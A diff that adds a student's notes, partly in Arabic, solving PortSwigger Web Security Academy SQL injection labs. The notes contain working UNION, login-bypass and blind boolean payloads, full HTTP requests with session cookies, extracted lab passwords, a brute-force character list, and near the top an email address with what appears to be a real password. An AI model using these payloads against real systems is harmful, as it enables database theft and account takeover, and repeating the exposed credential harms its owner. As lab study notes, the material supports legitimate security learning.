@@ -1,0 +1,678 @@
+All labs
+https://portswigger.net/web-security/all-labs#sql-injection
+-------------------------------------------------------------
+
+
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/retrieving-hidden-data
+
+
+Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+Solution
+
+    Use Burp Suite to intercept and modify the request that sets the product category filter.
+    Modify the category parameter, giving it the value '+OR+1=1-- 
+	
+	
+لاحظ يعرض فقط منتجات أقل	https://0a17002303dc9fc68087e9b1009100c2.web-security-academy.net/filter?category=Gifts
+
+لكن هكذا يعرض المخفي
+https://0a17002303dc9fc68087e9b1009100c2.web-security-academy.net/filter?category=Gifts'+OR+1=1-- 
+or
+https://0ae500be03f831a98299f2a000d2000a.web-security-academy.net/filter?category=Gifts%27+OR+0=0--
+or
+https://0ae500be03f831a98299f2a000d2000a.web-security-academy.net/filter?category=Gifts%27+OR+2=2--
+or 
+https://0ae500be03f831a98299f2a000d2000a.web-security-academy.net/filter?category=Gifts%27+OR+0=0--;/1111111111111111111111
+or 
+GET /filter?category=Gifts'+OR+7=7--;/ HTTP/2
+or
+https://0ae500be03f831a98299f2a000d2000a.web-security-academy.net/filter?category=Gifts'+OR+0=0-------------
+
+--------------------------------------------------------------
+
+		ahmed.abdulwhhab@std.mans.edu.eg
+		-y:8xM*3^;aL/R%H2J2XC=E-9optY5M2
+
+all labs https://portswigger.net/web-security/all-labs
+
+Lab 1
+SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+the programmer use Gifts from url address and use it in sql query.
+		PETS'+OR+1=1+--+---------
+-------------------------------------------------------------------
+Lab 2
+SQL injection vulnerability allowing login bypass
+		user administrator'+--
+		pass password
+--------------------------------------------------------------------
+Lab 3		
+SQL injection attack, querying the database type and version on Oracle
+		'+UNION+SELECT+'abc','def'+FROM+dual+--+------------
+		'+UNION+SELECT+BANNER,+NULL+FROM+v$version+--+----------
+--------------------------------------------------------------------
+Lab 4
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+'+UNION+SELECT+'abc','def'+--+------#	
+'+UNION+SELECT+@@version,+NULL+--+------#
+--------------------------------------------------------------------
+Lab 5
+SQL injection attack, listing the database contents on non-Oracle databases
+		'+UNION+SELECT+'abc','def'+--+------
+		'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+------
+		'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'+--+------
+		'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef+--+------
+-----------------------------------------------------------------------
+Lab 6
+SQL injection attack, listing the database contents on Oracle
+		'+UNION+SELECT+'abc','def'+FROM+dual+--+------
+		'+UNION+SELECT+table_name,NULL+FROM+all_tables+--+------
+		'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'+--+------
+		'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF+--+------
+-------------------------------------------------------------------------
+Lab 7
+SQL injection UNION attack, determining the number of columns returned by the query
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,NULL--
+
+my work
+Gifts'+--+-----------
+=Gifts'+union+select+Null,Null,Null--+-----------
+=Gifts'+ORDER+BY+3+--+-----------
+-----------------------------------------------------------------------------
+Lab 8
+SQL injection UNION attack, finding a column containing text
+	QUESTION MAKE DATABASE RETERIVES Xq34h0
+	'+UNION+SELECT+NULL,NULL,NULL--
+	'+UNION+SELECT+'abcdef',NULL,NULL--
+	category=Gifts'+ORDER+BY+3+--+---------
+	category=Gifts'+UNION+SELECT+1,2,3+--+------				GIVES ERROR
+	category=Gifts'+UNION+SELECT+'1',2,3+--+------				GIVES ERROR
+	category=Gifts'+UNION+SELECT+1,'2',3+--+------
+	category=Gifts'+UNION+SELECT+1,'Xq34h0',3+--+------
+-------------------------------------------------------------------------------
+Lab 9
+Lab: SQL injection UNION attack, retrieving data from other tables
+'+UNION+SELECT+'abc','def'+--+-------
+'+UNION+SELECT+username,+password+FROM+users+--+------
+
+category=Tech+gifts'+--+------------
+category=Tech+gifts'+UNION+SELECT+NULL,NULL+--+----------
+GUESS CAN WE CONSIDER  the database contents on non-Oracle databases ?
+category=Tech+gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+------	
+
+WE FOUND A TABLE CALLED users
+TRY GET DATA FROM IT 
+		'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'+--+------
+THREE COLUMNS APPEAR
+username
+email
+password		
+'+UNION+SELECT+username,+password+FROM+USERS+--+------
+-------------------------------------------------------
+Lab 10 Lab: SQL injection UNION attack, retrieving multiple values in a single column
+first value is number as per below test
+'+UNION+SELECT+1,'abc'+--+--------
+so the returned value is int,text
+so use one query to combine
+'+UNION+SELECT+1,username||'~'||password+FROM+users+--+--------
+'+UNION+SELECT+username||'~'||password,Null+FROM+users+--+--------
+
+another solution
+GUESS CAN WE CONSIDER  the database contents on non-Oracle databases ?
+a) 
+'+UNION+SELECT+1,username||'~'||password+FROM+users+--+--------
+b) 
+'+UNION+SELECT+null,+table_name+FROM+information_schema.tables+--+------
+TRY GET DATA FROM IT 
+		'+UNION+SELECT+1,+column_name+FROM+information_schema.columns+WHERE+table_name='users'+--+------
+THREE COLUMNS APPEAR
+username
+email
+password		
+c)
+'+UNION+SELECT+1,+password+FROM+USERS WHERE username='administrator'+--+------
+d)
+'+UNION+SELECT+1,+username+FROM+USERS+--+------
+Pest Control Umbrella	
+wiener	
+The Lazy Dog	
+administrator	
+carlos	
+Babbage Web Spray	
+More Than Just Birdsong
+e)
+'+UNION+SELECT+1,+password+FROM+USERS+--+------
+Pest Control Umbrella	
+onodeljsm2gjcfwum6c9	
+The Lazy Dog	
+5cnmdiorhl4ilkgr9q53	
+Babbage Web Spray	
+More Than Just Birdsong	
+ant17afa3t0hzj0ehn1l	
+
+f)
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users+--+--------
+administrator~5cnmdiorhl4ilkgr9q53		
+-------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------
+
+web-security-academy.net/filter?category=Gifts									OK
+web-security-academy.net/filter?category=Gifts'							Internal Server Error
+web-security-academy.net/filter?category=Gifts'--								OK
+No of Column
+using ORDER BY
+		web-security-academy.net/filter?category=Gifts'+ORDER+by+1+--					OK
+		web-security-academy.net/filter?category=Gifts'+ORDER+by+8--					OK
+		web-security-academy.net/filter?category=Gifts'+ORDER+by+9--					Internal Server Error
+	So Total No of Columns are 8
+Using Select NULL,8
+
+-------------------------------------------------------------------------------------------------
+Lab: SQL injection UNION attack, finding a column containing text
+QUESTION MAKE DATABASE RETERIVES Xq34h0
+'+UNION+SELECT+NULL,NULL,NULL--
+'+UNION+SELECT+'abcdef',NULL,NULL--
+category=Gifts'+ORDER+BY+3+--+---------
+category=Gifts'+UNION+SELECT+1,2,3+--+------				GIVES ERROR
+category=Gifts'+UNION+SELECT+'1',2,3+--+------				GIVES ERROR
+category=Gifts'+UNION+SELECT+1,'2',3+--+------
+category=Gifts'+UNION+SELECT+1,'Xq34h0',3+--+------
+-------------------------------------------------------------------------------------------------
+
+
+
+Lab 2 Modify username as per below 
+POST /login HTTP/2
+Host: 0a0000f903cd64c4806dc1340074004b.web-security-academy.net
+Cookie: session=P9LcuMSVBXKy21KY4IAe0LW0WV6z9W7X
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://0a0000f903cd64c4806dc1340074004b.web-security-academy.net
+Referer: https://0a0000f903cd64c4806dc1340074004b.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+csrf=FlNfWmP5WywGbL7jYx9sSY3t5Cadd3BU&username=administrator%27%2d%2d&password=12121
+
+try
+administrator'--
+or
+administrator%27%2d%2d
+
+-------------------------------------------------------
+
+Lab 3 XML Vulnerability
+here there is POST with 
+Product ID =1
+Store ID =1 for London
+			2 for Berlin
+			
+<@hex_entities>1 UNION SELECT username FROM users<@/hex_entities>			
+<@hex_entities>1 UNION SELECT password FROM users<@/hex_entities>			
+			
+double bars are concatination:
+
+select usename||' ' || passwd from dual;
+yields
+
+'hello world'			
+
+
+
+https://0a7400a5041f592c80a349a400610020.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL--
+
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+
+https://0a4c00840444e70787debb78005a00a1.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,'a',NULL--
+https://0a4c00840444e70787debb78005a00a1.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,'abcdef',NULL--
+
+
+
+Finding columns with a useful data type
+https://0a4c00840444e70787debb78005a00a1.web-security-academy.net/filter?category=Gifts' UNION SELECT 2 FROM DUAL--
+
+
+Rt42cJ
+
+---------------------------------------------
+Lab Data from other table
+a)		Main Address
+GET /filter?category=Pets HTTP/2							Content-Length		8830
+b)		Add ' or %27 at start and see results
+GET /filter?category=Pets' HTTP/2							Content-Length: 	2381		Internal Server Error
+c)		Add '+--+ to disable the end of conditions
+GET /filter?category=Pets'+--+ HTTP/2						Content-Length: 	8830
+GET /filter?category=Pets'+AND+1=0+--+ HTTP/2				Content-Length: 	3843
+GET /filter?category=Pets'+AND+1=1+--+ HTTP/2				Content-Length: 	8839
+GET /filter?category=Pets'+OR+1=1+--+ HTTP/2				Content-Length: 	28654
+d)		How many columns are used
+use ORDER BY 1  then 2 then 3 then 4 until you receive error
+GET /filter?category=Pets'+		ORDER+BY+1		+--+ HTTP/2			Content-Length: 	8842
+GET /filter?category=Pets'+		ORDER+BY+2		+--+ HTTP/2			Content-Length: 	8842
+GET /filter?category=Pets'+		ORDER+BY+3		+--+ HTTP/2			Content-Length: 	2381		Internal Server Error
+so no of columns are 2
+
+
+
+
+
+
+-------------------------------------------
+Blind SQL injection with conditional responses
+
+GET /filter?category=Gifts HTTP/2
+Host: 0a99002d035967e280af635000dd00f4.web-security-academy.net
+Cookie: TrackingId=sFu5jLKF2mokmQru; session=bMJ3trrTH7Gd3r3zeWGNMDtdsFSoypdR
+
+GET /filter?category=Accessories HTTP/2
+Host: 0a99002d035967e280af635000dd00f4.web-security-academy.net
+Cookie: TrackingId=sFu5jLKF2mokmQru; session=bMJ3trrTH7Gd3r3zeWGNMDtdsFSoypdR
+
+GET /filter?category=Lifestyle HTTP/2
+Host: 0a99002d035967e280af635000dd00f4.web-security-academy.net
+Cookie: TrackingId=sFu5jLKF2mokmQru; session=bMJ3trrTH7Gd3r3zeWGNMDtdsFSoypdR
+
+GET /filter?category=Corporate+gifts HTTP/2
+Host: 0a99002d035967e280af635000dd00f4.web-security-academy.net
+Cookie: TrackingId=sFu5jLKF2mokmQru; session=bMJ3trrTH7Gd3r3zeWGNMDtdsFSoypdR
+
+
+
+
+    Modify the TrackingId cookie, changing it to:
+    TrackingId=xyz' AND '1'='1
+
+    Verify that the "Welcome back" message appears in the response.
+
+    Now change it to:
+    TrackingId=xyz' AND '1'='2
+
+    Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
+
+    Now change it to:
+    TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+    Verify that the condition is true, confirming that there is a table called users.
+
+    Now change it to:
+    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+    Verify that the condition is true, confirming that there is a user called administrator.
+
+    The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+    This condition should be true, confirming that the password is greater than 1 character in length.
+
+    Send a series of follow-up values to test different password lengths. Send:
+    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+
+    Then send:
+    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+
+    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
+    After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+
+    In the Positions tab of Burp Intruder, change the value of the cookie to:
+    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+    This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+
+    Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
+    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+    To test the character at each position, you'll need to send su
+itable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under Payload settings add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
+Welcome back!
+
+
+
+TrackingId cookie, changing it to:
+TrackingId=xyz' AND '1'='1
+
+Verify that the Welcome back message appears in the response.
+
+Now change it to:
+TrackingId=xyz' AND '1'='2
+
+Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
+
+Now change it to:
+testing the follwing line in sq-lite
+ SELECT 'a' FROM table1; i
+result:-
+a
+a
+a
+a
+a
+
+عدد صفوف الجدول ، تم عرض حرف أ بالإنجليزية، وهك
+a
+we are sure now there is a table named as table1
+table1
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+
+Verify that the condition is true, confirming that there is a table called users.
+
+Now change it to:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+Verify that the condition is true, confirming that there is a user called administrator.
+
+The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+This condition should be true, confirming that the password is greater than 1 character in length.
+
+Send a series of follow-up values to test different password lengths. Send:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+
+Then send:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+
+And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.
+After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+
+In Burp Intruder, change the value of the cookie to:
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+
+Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.
+To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
+Launch the attack by clicking the Start attack button.
+Review the attack results to find the value of the character at the first position. You should see a column in the results called Welcome back. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
+
+Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+Launch the modified attack, review the results, and note the character at the second offset.
+Continue this process testing offset 3, 4, and so on, until you have the whole password.
+In the browser, click My account to open the login page. Use the password to log in as the administrator user. 
+
+---------------------
+My work
+Cookie: TrackingId=VMCaBEEot5stRS0F;
+Cookie: TrackingId=VMCaBEEot5stRS0F;
+Cookie: TrackingId=VMCaBEEot5stRS0F;
+
+try
+' AND '1'='1
+Cookie: TrackingId=zlZ8DdaGqHOizOXG' AND '1'='1;
+question
+1)	do you have a table named as users ?
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT 'S' FROM users LIMIT 1)='S;
+	
+	welcome back! confirms you have a table called users
+2)	do you have a column in users named as username and there is a username record is administrator?
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT 'S' FROM users WHERE username='administrator')='S;
+	
+	welcome back! confirms you have a column called username with record username
+3) Do you have password column in users table
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT 'S' FROM users WHERE username='administrator' AND LENGTH(password) >19)='S;
+
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT 'S' FROM users WHERE username='administrator' AND LENGTH(password) =20)='S; 
+we are sure password length is 20
+
+4) guess password letter by letter
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§S§;
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,2) FROM users WHERE username='administrator')='z§S§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,3) FROM users WHERE username='administrator')='zq§s§;
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,4) FROM users WHERE username='administrator')='zq6§s§;
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,5) FROM users WHERE username='administrator')='zq64§s§;
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,6) FROM users WHERE username='administrator')='zq64y§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,7) FROM users WHERE username='administrator')='zq64ys§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,8) FROM users WHERE username='administrator')='zq64ysu§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,9) FROM users WHERE username='administrator')='zq64ysum§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,10) FROM users WHERE username='administrator')='zq64ysumf§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,11) FROM users WHERE username='administrator')='zq64ysumf0§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,12) FROM users WHERE username='administrator')='zq64ysumf0e§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,13) FROM users WHERE username='administrator')='zq64ysumf0e0§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,14) FROM users WHERE username='administrator')='zq64ysumf0e0m§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,15) FROM users WHERE username='administrator')='zq64ysumf0e0m0§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,16) FROM users WHERE username='administrator')='zq64ysumf0e0m0p§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,17) FROM users WHERE username='administrator')='zq64ysumf0e0m0po§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,18) FROM users WHERE username='administrator')='zq64ysumf0e0m0poh§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,19) FROM users WHERE username='administrator')='zq64ysumf0e0m0pohw§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,20) FROM users WHERE username='administrator')='zq64ysumf0e0m0pohwt§s§; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,20) FROM users WHERE username='administrator')='zq64ysumf0e0m0pohwt1; 
+	Cookie: TrackingId=VMCaBEEot5stRS0F' AND (SELECT SUBSTRING(password,1,20) FROM users WHERE username='administrator')='zq64ysumf0e0m0pohwt1; 
+	
+	
+Single letter for password burste	
+ 
+!
+"
+#
+$
+%
+&
+'
+(
+)
+*
++
+,
+-
+.
+/
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+:
+;
+<
+=
+>
+?
+@
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+[
+\
+]
+^
+_
+`
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+{
+|
+}
+~
+€
+‚
+ƒ
+„
+…
+†
+‡
+ˆ
+‰
+Š
+‹
+Œ
+Ž
+‘
+’
+“
+”
+•
+–
+—
+˜
+™
+š
+›
+œ
+ž
+Ÿ
+ 
+¡
+¢
+£
+¤
+¥
+¦
+§
+¨
+©
+ª
+«
+¬
+­
+®
+¯
+°
+±
+²
+³
+´
+µ
+¶
+·
+¸
+¹
+º
+»
+¼
+½
+¾
+¿
+À
+Á
+Â
+Ã
+Ä
+Å
+Æ
+Ç
+È
+É
+Ê
+Ë
+Ì
+Í
+Î
+Ï
+Ð
+Ñ
+Ò
+Ó
+Ô
+Õ
+Ö
+×
+Ø
+Ù
+Ú
+Û
+Ü
+Ý
+Þ
+ß
+à
+á
+â
+ã
+ä
+å
+æ
+ç
+è
+é
+ê
+ë
+ì
+í
+î
+ï
+ð
+ñ
+ò
+ó
+ô
+õ
+ö
+÷
+ø
+ù
+ú
+û
+ü
+ý
+þ
+ÿ
